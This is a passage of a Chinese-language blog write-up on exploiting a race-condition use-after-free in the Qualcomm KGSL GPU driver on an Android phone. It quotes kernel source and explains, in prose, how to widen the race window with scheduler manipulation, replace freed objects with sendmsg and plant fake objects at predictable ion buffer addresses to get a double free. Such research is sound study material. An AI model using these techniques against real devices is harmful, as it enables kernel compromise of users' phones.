<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_wait</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    fence = kgsl_timelines_to_fence_array(device, param-&gt;timelines,</span><br><span class="line">        param-&gt;count, param-&gt;timelines_size,</span><br><span class="line">        (param-&gt;flags == KGSL_TIMELINE_WAIT_ANY));     <span class="comment">//&lt;------ dma_fence created and added to timeline</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (!timeout)</span><br><span class="line">        ret = dma_fence_is_signaled(fence) ? <span class="number">0</span> : -EBUSY;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = dma_fence_wait_timeout(fence, <span class="literal">true</span>, timeout);   <span class="comment">//&lt;----- 1.</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dma_fence_put(fence);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>kgsl_timelines_to_fence_array</code>创建<code>dma_fence</code>对象，并将其添加到<code>timeline</code>上。如果指定了一个 <code>timeout</code> ，那么该调用将进入<code>dma_fence_wait_timeout</code>（路径标记为1）进行等待，直到超时或线程收到中断。在<code>dma_fence_wait_timeout</code>结束后，<code>dma_fence_put</code>被调用，以将<code>dma_fence</code>的<code>refcount</code>减少到0，释放被添加到<code>timeline</code>上的<code>dma_fence</code>。</p>
<p>虽然<code>IOCTL_KGSL_TIMELINE_FENCE_GET</code>乍看之下似乎更容易使用和控制，但实际上，关闭<code>sync_file</code>产生的开销使得销毁<code>dma_fence</code>的时间不那么可靠。因此，对于这个bug，这里使用<code>IOCTL_KGSL_TIMELINE_FENCE_GET</code>来创建和添加持久化的<code>dma_fence</code>对象来填充<code>timeline-&gt;fences</code>列表，以扩大竞争窗口，而用于UAF漏洞的最后一个<code>dma_fence</code>对象是使用<code>IOCTL_KGSL_TIMELINE_WAIT</code>添加的，当发送中断信号给调用<code>IOCTL_KGSL_TIMELINE_WAIT</code>的线程，它就被释放。</p>
<h2 id="Widening-the-tiny-race-window"><a href="#Widening-the-tiny-race-window" class="headerlink" title="Widening the tiny race window"></a>Widening the tiny race window</h2><p>为了利用这个漏洞，需要在以下代码块中标记的第一个竞争窗口内删除<code>kgsl_timeline</code>的 <code>fences</code> 列表中的<code>dma_fence</code>的<code>refcount</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//BEGIN OF FIRST RACE WINDOW</span></span><br><span class="line">    spin_lock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node)</span><br><span class="line">        dma_fence_get(&amp;fence-&gt;base);</span><br><span class="line">    list_replace_init(&amp;timeline-&gt;fences, &amp;temp);</span><br><span class="line">    spin_unlock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    <span class="comment">//END OF FIRST RACE WINDOW</span></span><br><span class="line">    <span class="comment">//BEGIN OF SECOND RACE WINDOW</span></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    <span class="comment">//END OF SECOND RACE WINDOW</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如前所述，通过向<code>timeline-&gt;fences</code>添加大量的<code>dma_fence</code>对象，可以扩大第一个竞争窗口，这使得在这个窗口内很容易触发<code>refcount</code>的减少。然而，为了利用这个错误，下面的代码以及对象替换必须在第二个竞争窗口结束前完成：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irqsave(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line">list_for_each_entry_safe(cur, temp, &amp;timeline-&gt;fences, node) &#123;</span><br><span class="line">    <span class="keyword">if</span> (f != cur)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    list_del_init(&amp;f-&gt;node);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irqrestore(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line">trace_kgsl_timeline_fence_release(f-&gt;timeline-&gt;id, fence-&gt;seqno);</span><br><span class="line">kgsl_timeline_put(f-&gt;timeline);</span><br><span class="line">dma_fence_free(fence);</span><br></pre></td></tr></table></figure>

<p>如前所述，由于<code>spin_lock</code>的存在，在第一个竞争窗口结束之前，上述代码不能执行，但在运行这段代码时，<code>timeline-&gt;fence</code>已经被清空，所以循环会很快运行。然而，由于<code>dma_fence_free</code>使用了<code>kfree_rcu</code>，实际释放<code>fence</code>的时间被推迟了。这使得我们不可能在第二个竞争窗口结束前替换已释放的<code>fence</code>，除非能操纵调度器。这里使用[Exploiting race conditions on (ancient) Linux](<a target="_blank" rel="noopener" href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019">https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019</a> - Exploiting race conditions on Linux.pdf)，另一个Android漏洞中也使用了这项<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">技术</a>，以扩大这个竞争窗口。</p>
<p><strong>下面是关于这项技术的概述：</strong></p>
<p><strong>为了确保每个任务（线程或进程）有公平的CPU时间片，Linux内核调度程序可以中断一个正在运行的任务，并将其搁置，以便另一个任务可以运行。这种中断和停止任务的行为被称为抢占（被中断的任务被抢占）。一个任务也可以把自己搁置起来，让另一个任务运行，比如当它在等待一些I&#x2F;O输入时，或者当它调用<code>sched_yield()</code>时。在这种情况下，我们说该任务是自愿抢占的。抢占也可以发生在系统调用内部，比如<code>ioctl</code>调用，在Android上，除了一些关键区域（比如持有自旋锁），任务可以被抢占。这种行为可以通过使用CPU亲和力和任务优先级来操纵。</strong></p>
<p><strong>默认情况下，一个任务以<code>SCHED_NORMAL</code>的优先级运行，但也可以使用<code>sched_setscheduler</code>调用（或线程的<code>pthread_setschedparam</code>）设置一个较低的优先级<code>SCHED_IDLE</code>。此外，还可以用<code>sched_setaffinity</code>将其固定在一个CPU上，这将只允许它在一个特定的CPU上运行。通过将两个任务（一个具有<code>SCHED_NORMAL</code>优先级，另一个具有<code>SCHED_IDLE</code>优先级）固定在同一个CPU上，可以控制抢占的时间，如下所示：</strong></p>
<ol>
<li><strong>首先让<code>SCHED_NORMAL</code>任务执行一个系统调用，导致它暂停和等待。例如，它可以从一个没有数据进入的管道中读取数据，然后它将等待更多的数据，并主动抢占自己的位置，以便<code>SCHED_IDLE</code>任务可以运行。</strong></li>
<li><strong>当<code>SCHED_IDLE</code>任务正在运行时，向<code>SCHED_NORMAL</code>任务一直在等待的管道发送一些数据。这将唤醒<code>SCHED_NORMAL</code>任务，使其抢占<code>SCHED_IDLE</code>任务，由于任务的优先级，<code>SCHED_IDLE</code>任务将被抢占并搁置。</strong></li>
<li><strong>然后<code>SCHED_NORMAL</code>任务可以运行一个繁忙循环，以防止<code>SCHED_IDLE</code>任务被唤醒。</strong></li>
</ol>
<p>在这个bug的漏洞利用中，该技术使用如下所示：</p>
<ol>
<li><p>在一个线程上运行<code>IOCTL_KGSL_TIMELINE_WAIT</code>，向<code>kgsl_timeline</code>添加<code>dma_fence</code>对象。将超时设置为一个大值，并使用 <code>sched_setaffinity</code> 将这个任务固定在一个 CPU 上，称之为 <code>SPRAY_CPU</code>。一旦<code>dma_fence</code>对象被添加，这个任务就会变成空闲状态，直到它收到一个中断。</p>
</li>
<li><p>设置一个<code>SCHED_NORMAL</code>任务，并将其固定在另一个CPU上（<code>DESTROY_CPU</code>），该 CPU 监听一个空管道。这将导致这个任务最初变得空闲，并允许<code>DESTROY_CPU</code>运行一个低优先级的任务。一旦空管道收到一些数据，这个任务就会运行一个繁忙的循环。</p>
</li>
<li><p>在<code>DESTROY_CPU上</code>设置一个<code>SCHED_IDLE</code>任务，它将运行<code>IOCTL_KGSL_TIMELINE_DESTROY</code>来销毁步骤一中加入<code>dma_fence</code>的<code>timeline</code>。由于第二步中设置的任务正在等待空管的响应，<code>DESTROY_CPU</code>将首先运行这个任务。</p>
</li>
<li><p>向运行<code>IOCTL_KGSL_TIMELINE_WAIT</code>的任务发送一个中断。然后，在<code>IOCTL_KGSL_TIMELINE_DESTROY</code>在第一个竞争窗口内运行时，该任务将解除封锁并释放<code>dma_fence</code>。</p>
</li>
<li><p>写入<code>SCHED_NORMAL</code>任务正在监听的空管道。这将导致<code>SCHED_NORMAL</code>任务抢占<code>SCHED_IDLE</code>任务。一旦它成功地抢占了任务，<code>DESTROY_CPU</code>将运行繁忙循环，导致<code>SCHED_IDLE</code>任务被搁置。</p>
</li>
<li><p>由于运行<code>IOCTL_KGSL_TIMELINE_DESTROY</code>的<code>SCHED_IDLE</code>任务被搁置，现在有足够的时间来克服<code>kfree_rcu</code>引入的延迟，并允许步骤4中的<code>dma_fence</code>被释放和替换。之后，恢复<code>IOCTL_KGSL_TIMELINE_DESTROY</code>，这样后续的操作将在现在被释放和替换的<code>dma_fence</code>对象上执行。</p>
</li>
</ol>
<p>这里需要注意的是，因为在线程持有自旋锁的时候不能发生抢占，所以<code>IOCTL_KGSL_TIMELINE_DESTROY</code>只能在自旋锁之间的窗口期抢占，如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    spin_lock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node)</span><br><span class="line">      ...</span><br><span class="line">    spin_unlock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    <span class="comment">//Preemption window</span></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然上面的抢占窗口看起来非常小，但在实践中，只要<code>SCHED_NORMAL</code>任务试图在第一个自旋锁被持有时抢占运行<code>IOCTL_KGSL_TIMELINE_DESTROY</code>的<code>SCHED_IDLE</code>任务，一旦自旋锁被释放，抢占就会发生，这使得在正确的时间抢占<code>IOCTL_KGSL_TIMELINE_DESTROY</code>更容易成功。</p>
<p>下图红色块表示持有自旋锁的区域，因此不可能抢占，虚线表示闲置的任务：</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-2.webp" alt="Kernel-2"></p>
<p>对于对象的替换，使用<a target="_blank" rel="noopener" href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html"><code>sendmsg</code></a>，这是一种标准的方法，可以用受控数据替换linux内核中的已释放的对象。下面是假对象是如何被使用的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">    dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">    dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">    dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irq(&amp;timeline-&gt;lock);</span><br></pre></td></tr></table></figure>

<p>三个不同的函数，<code>dma_fence_set_error</code>、<code>dma_fence_signal_locked</code>和<code>dma_fence_put</code>将被调用，参数为<code>fence</code>。函数<code>dma_fence_set_error</code>将向<code>fence</code>对象写一个错误代码，这可能对合适的对象替换有用，但对<code>sendmsg</code>对象替换没有用，函数<code>dma_fence_signal_locked</code>如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dma_fence_signal_locked</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (unlikely(test_and_set_bit(DMA_FENCE_FLAG_SIGNALED_BIT,   <span class="comment">//&lt;-- 1.</span></span><br><span class="line">                      &amp;fence-&gt;flags)))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Stash the cb_list before replacing it with the timestamp */</span></span><br><span class="line">    list_replace(&amp;fence-&gt;cb_list, &amp;cb_list);                    <span class="comment">//&lt;-- 2.</span></span><br><span class="line">    ...</span><br><span class="line">    list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) &#123;        <span class="comment">//&lt;-- 3.</span></span><br><span class="line">        INIT_LIST_HEAD(&amp;cur-&gt;node);</span><br><span class="line">        cur-&gt;func(fence, cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先检查<code>fence-&gt;flags</code>（1）：如果<code>DMA_FENCE_FLAG_SIGNALED_BIT</code>标志被设置，那么<code>fence</code>已经被信号化，函数退出。如果<code>fence</code>没有被发出信号，那么会调用<code>list_replace</code>来移除<code>fence-&gt;cb_list</code>中的对象，并将其放入临时<code>cb_list</code>中（2） 之后，存储在<code>cb_list</code>中的函数被调用（3）。正如在 <code>kCFI </code>一节中解释的那样，因为<code>CFI</code>的缓解，这将只允许调用某种类型的函数；此外，在这个阶段，由于对函数地址一无所知，所以如果走到达这个路径，很可能只会让内核崩溃。所以，只能在假对象中设置<code>DMA_FENCE_FLAG_SIGNALED_BIT</code>标志，让<code>dma_fence_signal_locked</code>提前退出。</p>
<p>只剩下了、<code>dma_fence_put</code>函数，它减少<code>fence</code>的<code>refcount</code>，并在<code>refcount</code>达到0时调用<code>dma_fence_release</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dma_fence_release</span><span class="params">(<span class="keyword">struct</span> kref *kref)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fence-&gt;ops-&gt;release)</span><br><span class="line">        fence-&gt;ops-&gt;release(fence);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dma_fence_free(fence);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果调用<code>dma_fence_release</code>，那么最终会检查<code>fence-&gt;ops</code>并调用<code>fence-&gt;ops-&gt;release</code>。这就有两个问题。首先，<code>fence-&gt;ops</code>需要指向有效的内存，否则解除引用就会失败，即使解除引用成功，<code>fence-&gt;ops-&gt;release</code>要么需要为零，要么必须是一个适当类型的函数的地址。</p>
<p>所有这些给了两个选择。可以遵循标准路径：尝试用另一个对象替换栅栏对象，或者尝试利用<code>dma_fence_put</code>和<code>dma_fence_set_error</code>提供的有限的写原语，同时希望仍然可以控制<code>flags</code>和<code>refcount</code>字段以避免<code>dma_fence_signal_locked</code>或<code>dma_fence_release</code>使内核崩溃。</p>
<h2 id="The-ultimate-fake-object-store"><a href="#The-ultimate-fake-object-store" class="headerlink" title="The ultimate fake object store"></a>The ultimate fake object store</h2><p>在利用另一个<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">错误</a>时，作者发现了软件输入输出转换旁观缓冲区（<code>SWIOTLB</code>），这是一个在启动时很早就分配的内存区域。因此，<code>SWIOTLB</code>的物理地址是非常固定的，只取决于硬件配置。此外，由于该内存位于 “低内存 “区域（Android设备似乎没有 “高内存 “区域），并且不在内核镜像中，因此虚拟地址只是带有固定偏移的物理地址（对细节感兴趣的读者可以关注<code>kmap</code>函数的实现）:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __virt_to_phys_nodebug(x) (&#123;                   \</span></span><br><span class="line"><span class="meta">    phys_addr_t __x = (phys_addr_t)(__tag_reset(x));        \</span></span><br><span class="line"><span class="meta">    __is_lm_address(__x) ? __lm_to_phys(__x) : __kimg_to_phys(__x); \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __is_lm_address(addr)  (!(((u64)addr) &amp; BIT(vabits_actual - 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __lm_to_phys(addr) (((addr) + physvirt_offset))</span></span><br></pre></td></tr></table></figure>

<p>上述定义来自<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/include/asm/memory.h"><code>arch/arm64/include/asm/memory.h</code></a>，它是Android的相关实现。用于翻译地址的变量<code>physvirt_offset</code>是在<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/mm/init.c#L517"><code>arm64_memblock_init</code></a>中设置的一个固定常数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">arm64_memblock_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;...</span><br><span class="line">    memstart_addr = round_down(memblock_start_of_DRAM(),</span><br><span class="line">                   ARM64_MEMSTART_ALIGN);</span><br><span class="line">    physvirt_offset = PHYS_OFFSET - PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除此之外，<code>SWIOTLB</code>中的内存可以通过<code>adsp</code>驱动访问，而<code>adsp</code>驱动是可以从一个不受信任的应用程序中到达的，所以这似乎是一个存储假对象和重定向假指针的好地方。然而，在5.x版本的内核中，<code>SWIOTLB</code>只有在用<code>CONFIG_DMA_ZONE32</code>标志编译内核时才会被分配，而Z Flip3 不是这种情况。</p>
<p>然而，还有更好的东西。<code>SWIOTLB</code>的早期分配给了它一个可预测的地址，这促使作者检查启动日志，看看是否有其他的内存区域在启动过程中被提前分配，结果发现确实有其他的内存区域在启动过程中被很早地分配。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  Reserved memory: created CMA memory pool at 0x00000000f2800000, size 212 MiB</span><br><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  OF: reserved mem: initialized node secure_display_region, compatible <span class="built_in">id</span> shared-dma-pool</span><br><span class="line">...</span><br><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  OF: reserved mem: initialized node user_contig_region, compatible <span class="built_in">id</span> shared-dma-pool</span><br><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  Reserved memory: created CMA memory pool at 0x00000000f0c00000, size 12 MiB</span><br><span class="line"></span><br><span class="line">&lt;6&gt;[    0.578613] [7:      swapper/0:    1]  platform soc:qcom,ion:qcom,ion-heap@22: assigned reserved memory node sdsp_region</span><br><span class="line">...</span><br><span class="line">&lt;6&gt;[    0.578829] [7:      swapper/0:    1]  platform soc:qcom,ion:qcom,ion-heap@26: assigned reserved memory node user_contig_region</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>上面的保留内存区域似乎是用于分配<code>ion</code>缓冲区的内存池。</p>
<p>在Android上，<code>ion_allocator</code>被用来分配用于<code>DMA</code>（直接内存访问）的内存区域，允许内核驱动和用户空间进程共享同一底层内存。未受信任的应用程序可以通过<code>/dev/ion</code>文件访问<code>ion</code>分配器，<code>ION_IOC_ALLOC</code> <code>ioctl</code>可以用来分配一个<code>ion</code>缓冲区。该<code>ioctl</code>向用户返回一个新的文件描述符，然后可以在<code>mmap syscall</code>中使用，将<code>ion</code>缓冲区的后备存储映射到用户空间。</p>
<p>使用<code>ion</code>缓冲区的一个特殊原因是，用户可以请求具有连续物理地址的内存。这一点特别重要，因为有些设备（如硬件上的设备，而不是手机本身）直接访问物理内存，拥有连续的内存地址可以大大改善这种内存访问的性能，而有些设备不能处理非连续的物理内存。</p>
<p>与<code>SWIOTLB</code>类似，为了确保具有请求大小的连续物理内存区域可用，<code>ion</code>驱动在启动初期就分配了这些内存区域，并将其作为内存池（”划出的区域”），然后在以后的请求中用于分配<code>ion</code>缓冲区。并非<code>ion</code>设备中的所有内存池都是连续的内存（例如，通用的 “系统堆 “可能不是物理上连续的区域），但是用户可以在使用<code>ION_IOC_ALLOC</code>时指定<code>heap_id_mask</code>来指定具有特定属性（例如，连续的物理内存）的<code>ion</code>堆。</p>
<p>这些内存池在如此早的阶段被分配，意味着它们的地址是可预测的，只取决于硬件的配置（设备树、可用内存、内存起始地址、各种启动参数等）。这尤其意味着，如果使用<code>ION_IOC_ALLOC</code>从一个很少使用的内存池中分配一个<code>ion</code>缓冲区，这个缓冲区很可能被分配到一个可预测的地址。如果使用<code>mmap</code>将缓冲区映射到用户空间，就可以在任何时候访问这个可预测地址的内存了。</p>
<p>经过一些实验，似乎<code>user_contig_region</code>几乎从未被使用，每次都能把整个区域映射到用户空间。所以在这个漏洞中，作者使用了这个内存池，并假设可以分配整个区域以保持简单。(在不影响可靠性的情况下，修改漏洞以适应部分区域不可用的情况是很容易的)。</p>
<p>现在能够把受控的数据放在一个可预测的地址上，可以解决之前在利用中遇到的问题。回顾一下，当<code>dma_fence_release</code>在假 <code>fence</code> 对象上被调用时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dma_fence_release</span><span class="params">(<span class="keyword">struct</span> kref *kref)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fence-&gt;ops-&gt;release)</span><br><span class="line">        fence-&gt;ops-&gt;release(fence);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dma_fence_free(fence);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有一个问题，需要<code>fence-&gt;ops</code>指向一个包含所有零的有效地址，这样<code>fence-&gt;ops-&gt;release</code>就不会被调用（因为在这个阶段没有一个有效的函数地址与<code>fence-&gt;ops-&gt;release</code>的签名相匹配，走这个路径会使内核崩溃）。</p>
<p>由于<code>ion</code>缓冲区在一个可预测的地址上，可以简单地把它填为零，让<code>fence-&gt;ops</code>指向那里。这将确保<code>dma_fence_free</code>路径被采取，然后释放假对象，形成一个<code>double free</code>的原形，同时防止内核崩溃。在继续利用这个<code>double free</code>原语之前，还有一个问题需要首先解决。</p>
<h2 id="Escaping-an-infinite-loop"><a href="#Escaping-an-infinite-loop" class="headerlink" title="Escaping an infinite loop"></a>Escaping an infinite loop</h2><p>回顾一下，在<code>kgsl_ioctl_timeline_destroy</code>函数中，在<code>fence</code>对象被销毁和替换后，会执行以下循环：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">    dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">    dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">    dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irq(&amp;timeline-&gt;lock);</span><br></pre></td></tr></table></figure>

<p><code>list_for_each_entry_safe</code> 将首先从 <code>list_head</code> <code>temp</code> 中获取下一个指针，找到列表中的第一个<code>fence</code>条目，然后通过跟踪 <code>fence-&gt;node</code> 中的下一个指针进行迭代，直到下一个条目再次指向 <code>temp</code>。如果下一个条目没有指向<code>temp</code>，那么这个循环就会继续。这是一个变量初始化使利用更加困难的地方。看看<code>kgsl_timeline_fence</code>的结构，它嵌入了一个<code>dma_fence</code>对象，被添加到<code>kgsl_timeline</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kgsl_timeline_fence</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_fence</span> <span class="title">base</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kgsl_timeline</span> *<span class="title">timeline</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

